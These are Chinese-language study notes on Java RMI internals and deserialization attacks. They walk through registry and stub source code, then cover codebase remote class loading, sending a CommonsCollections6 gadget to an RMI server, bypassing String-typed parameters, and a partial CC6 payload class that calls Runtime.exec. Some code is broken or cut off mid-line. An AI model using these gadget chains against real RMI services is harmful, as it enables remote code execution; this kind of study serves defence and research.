# RMI
远程方法调用，让一个java虚拟机上的对象调用另一个java虚拟机对象上的方法，对象是使用序列化传输
执行远程方法的时候，还是在远程服务上执行的。
    package org.zzlearn_test.RMI;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    public interface ServiceInterface extends Remote {
        String hello(String a) throws RemoteException;//在客户端中也需要调用该接口，所以需要将需要实现的方法写在这里
    }
    package org.zzlearn_test.RMI;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class Service extends UnicastRemoteObject implements ServiceInterface {
        protected Service() throws RemoteException {
            super();
        }
        public String hello(String a) throws RemoteException {
            System.out.println("call from "+a);
            return "Hello " + a;
        }
    }
    package org.zzlearn_test.RMI;
    import java.rmi.Naming;
    import java.rmi.registry.LocateRegistry;
    public class RMIServer {
        private void start() throws Exception {
            serivce h = new serivce();
            LocateRegistry.createRegistry(1091);
            Naming.bind("rmi://127.0.0.1:1091/Hello", h);
        }
        public static void main(String[] args) throws Exception {
            new RMIServer().start();
        }
    }
    package org.zzlearn_test.RMI;
    import java.rmi.Naming;
    public class RMIClient {
        public static void main(String[] args) throws Exception {
            ServiceInterface hello = (ServiceInterface)
                    Naming.lookup("rmi://127.0.0.1:1091/Hello");
            String ret = hello.hello("test2");
            System.out.println( ret);
        }
    }
    //如果引用远程接口serialVersionUID必须一致。
  1. RMIServer会在RMI Registry上注册一个Name到对象的绑定关系
  2. 在通信过程中进行了两次TCP握手，第一次是连接我们指定的端口，然后client第一次先连接RMI Registry，远端回复一个Data消息，Data中有新的端口然后客户端连接新的端口。
  3. Client按照Data中的信息（ip，端口）连接RMI服务。
  4. Client传输参数，server执行然后返回结果。
## RMI执行步骤
### 创建注册中心
获取注册中心有两种方式，LocateRegistry.createRegistry和LocateRegistry.getRegistry
#### 通过createRegistry获取
createRegistry有两种实现方法
    public static Registry createRegistry(int port) throws RemoteException {
            return new RegistryImpl(port);
        }
        public static Registry createRegistry(int port, RMIClientSocketFactory csf,RMIServerSocketFactory ssf)throws RemoteException{
            return new RegistryImpl(port, csf, ssf);
        }
但是一般采用第一种，直接传入port即可，两种都是获取一个RegistryImpl对象。
在new
RegistryImpl时，LiveRef中封装了ip，端口等信息（高版本会加入filter等等），然后传入UnicastServerRef中，进行一下数据的封装。
    LiveRef var1x = new LiveRef(RegistryImpl.id, var1);
    RegistryImpl.this.setup(new UnicastServerRef(var1x));
进入RegistryImpl.this.setup
    private void setup(UnicastServerRef var1) throws RemoteException {
            this.ref = var1;
            var1.exportObject(this, (Object)null, true);
        }
进入var1.exportObject，var1就是UnicastServerRef对象。
。。。。。。
最终调用TCPTransport的exportObject方法，然后开启监听。
最终通过ObjectTable.getTarget()从socket流中获取ObjId，然后通过ObjId获取Target对象，然后调用UnicastServerRef#dispatch
-》 UnicastServerRef#oldDispatch -》
RegistryImpl_Skel#dispatch，然后根据参数（0就是bind，2就是lookup）处理请求，所以无论是客户端还是服务端最终处理请求都是通过创建RegistryImpl对象进行调用。
#### 通过getRegistry获取
通过UnicastRef包装LiveRef，里面包含了ObjID、host、port等信息。
    public static Registry getRegistry(String host, int port,RMIClientSocketFactory csf)throws RemoteException{
           ......
            LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                            new TCPEndpoint(host, port, csf, null),
                            false);
            RemoteRef ref =
                (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);
            return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
        }
然后创建一个`RegistryImpl_Stub`对象
    private static RemoteStub createStub(Class remoteClass, RemoteRef ref)
            throws StubNotFoundException
        {
            String stubname = remoteClass.getName() + "_Stub";
            try {
                Class stubcl =
                    Class.forName(stubname, false, remoteClass.getClassLoader());
                Constructor cons = stubcl.getConstructor(stubConsParamTypes);
                return (RemoteStub) cons.newInstance(new Object[] { ref });
最终获得一个`RegistryImpl_Stub`对象
#### 服务端、客户端与注册中心通信（bind、unbind、rebind、lookup）
最终在服务端通过createRegistry返回的是RegistryImpl对象，里面有个bindings，以键值储存了绑定的对象，使用bind、unbind、rebind都会直接进入绑定阶段。所以使用createRegistry返回的RegistryImpl对象是无法打注册端的，直接就注册了，根本就没有传输到注册端过程。
    Registry registry = LocateRegistry.createRegistry(1091);
    registry.bind("rmi://127.0.0.1:1091/Hello", h);
    进入bind方法
        public void bind(String var1, Remote var2) throws RemoteException, AlreadyBoundException, AccessException {
            checkAccess("Registry.bind");
            synchronized(this.bindings) {
                Remote var4 = (Remote)this.bindings.get(var1);
                if (var4 != null) {
                    throw new AlreadyBoundException(var1);
                } else {
                    this.bindings.put(var1, var2);
如果使用`LocateRegistry.*getRegistry*`那么就会获得一个RegistryImpl_Stub对象，进入bind方法，先执行newCall方法，在里面会写入一些数据。然后序列化对象名称和要绑定的对象。然后invoke方法将数据发送到注册端。
    public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
            try {
                RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);
                try {
                    ObjectOutput var4 = var3.getOutputStream();
                    var4.writeObject(var1);
                    var4.writeObject(var2);
                } catch (IOException var5) {
                    throw new MarshalException("error marshalling arguments", var5);
                }
                super.ref.invoke(var3);
                super.ref.done(var3);
注册端接收数据
然后交给UnicastServerRef#dispatch处理，dispatch会得到传输过来的两个对象
可以看见skel值不为null，就会进入oldDispatch中进行，然后进入RegistryImpl_Skel#dispatch
在注册中心的RegistryImpl_Skel#dispatch方法里面执行readObject操作。然后执行对应操作（bind、unbind）
当然高版本会有其他操作，检查绑定ip等等
    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
                RegistryImpl var6 = (RegistryImpl)var1;
                String var7;
                Remote var8;
                ObjectInput var10;
                ObjectInput var11;
                switch(var3) {
                case 0:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
    ......
                    var6.bind(var7, var8);
然后进入bind函数，到这里与createRegistry直接使用bind就是一样的了。
### 客户端发送参数
客户端执行lookup后会生成一个代理对象，所以执行方法会进入代理对象的invoke方法
判断要调用的方法是否在所有对象中有，然后进入invokeObjectMethod或者invokeRemoteMethod
    public Object invoke(Object proxy, Method method, Object[] args){
            if (method.getDeclaringClass() == Object.class) {
                return invokeObjectMethod(proxy, method, args);
    ......
            } else {
                return invokeRemoteMethod(proxy, method, args);
            }
        }
然后进入RemoteObjectInvocationHandler#invokeRemoteMethod，然后执行ref.invoke，将proxy,
method, args，和method的hash传入
    private Object invokeRemoteMethod(Object proxy,Method method,Object[] args)throws Exception{
    ......
                return ref.invoke((Remote) proxy, method, args,getMethodHash(method));
然后进入UnicastRef#invoke->TCPChannel#newConnection发送数据
然后回到UnicastRef#invoke->UnicastRef#marshalValue将传递的参数序列化写入连接。
然后回到UnicastRef#invoke执行`var7.executeCall();`传输数据并获取结果。
然后在UnicastRef#invoke的`Object var50 = *unmarshalValue*(var49,
(ObjectInput)var11);`，然后执行readObject，使用的是jdk自带的readObject。
### 服务端接收参数
服务端通过Transport#serviceCall获取传输过来的信息
然后交给UnicastServerRef#dispatch处理，dispatch会得到传输过来的两个对象
进入UnicastServerRef后，skel为null，就不会进入注册（bind、unbind等等）处理
一直执行到`params = unmarshalParameters(obj, method,
marshalStream);`进行数据处理，判断是否为DeserializationChecker的实例
    private Object[] unmarshalParameters(Object obj, Method method, MarshalInputStream in)
        throws IOException, ClassNotFoundException {
            return (obj instanceof DeserializationChecker) ?
                unmarshalParametersChecked((DeserializationChecker)obj, method, in) :
                unmarshalParametersUnchecked(method, in);
        }
进入unmarshalParametersUnchecked
    private Object[] unmarshalParametersUnchecked(Method method, ObjectInput in)
        throws IOException, ClassNotFoundException {
            Class[] types = method.getParameterTypes();
            Object[] params = new Object[types.length];
            for (int i = 0; i 
由于RMI传输数据会经过序列化和反序列化，可以直接传输gadget chain
### 利用codebase执行任意代码
codebase是一个地址告诉虚拟机在哪里搜索类，如：codebase=
但是只有如下条件的服务器才能被攻击：
  1. 设置了java.rmi.server.useCodebaseOnly=false，或者java版本低于7u21、6u45（低于这几个版本默认为false）
  2. 设置`System.*setSecurityManager*(new RMISecurityManager());`
否则java只会信任默认配置好的codebase
    java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient
### 攻击服务端
条件：
  1. RMI服务需要接受Object类型数据（实际依据传入的对象类型，CC6改为Map也可以）
  2. 服务端要有可以利用的组件或者漏洞
    public class RMIClient {
        public static void main(String[] args) throws Exception {
            Object seri = CommonsCollections6TemplatesImpl();
            ServiceInterface hello = (ServiceInterface)
                    Naming.lookup("rmi://127.0.0.1:1091/Hello");
            String ret = hello.hello(seri);
            System.out.println(ret);
        }
    }
#### 绕过Object
jdk 8u66
反序列化的利用点就是UnicastRef的unmarshalValue方法。
    protected static Object unmarshalValue(Class var0, ObjectInput var1) throws IOException, ClassNotFoundException {
            if (var0.isPrimitive()) {
                if (var0 == Integer.TYPE) {
                    return var1.readInt();
                } else if (var0 == Boolean.TYPE) {
                    return var1.readBoolean();
                } else if (var0 == Byte.TYPE) {
                    return var1.readByte();
                } else if (var0 == Character.TYPE) {
                    return var1.readChar();
                } else if (var0 == Short.TYPE) {
                    return var1.readShort();
                } else if (var0 == Long.TYPE) {
                    return var1.readLong();
                } else if (var0 == Float.TYPE) {
                    return var1.readFloat();
                } else if (var0 == Double.TYPE) {
                    return var1.readDouble();
                } else {
                    throw new Error("Unrecognized primitive type: " + var0);
                }
            } else {
                return var1.readObject();
            }
        }
只要不是基本类型都能进入`var1.readObject();`，如果传入的数据类型是Object，我们可以利用任何可以利用的链，但是如果是String类型的嘞，这样就无法传入类似于CC6那种Map的利用链，如果直接修改客户端接口类型会在验证Method
Hash阶段报错，所以不仅要修改参数类型还需要修改Method Hash，或者先计算出正确的Hash然后替换参数。
国外的大佬afanti总结了几种利用方式
  1. 修改rmi源码
  2. 添加调试器hook客户端程序
  3. 使用Javassist更改字节码
  4. 使用网络代理更改已经序列化对象
利用工具：
修改VM参数：`-javaagent:E:\windows\download\rasp-1.0-SNAPSHOT.jar`
将其中的URLDNS更换为CC6的利用链
    package afanti.rasp.util;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    import org.apache.commons.collections4.map.LazyMap;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    public class CC6 {
        public static Object getObject(final String url) throws Exception {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{url}),
                    new ConstantTransformer(1)};
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);
            TiedMapEntry tme = new TiedMapEntry(lazyMap, "x");
            HashSet hashSet = new HashSet(1);
            hashSet.add("test");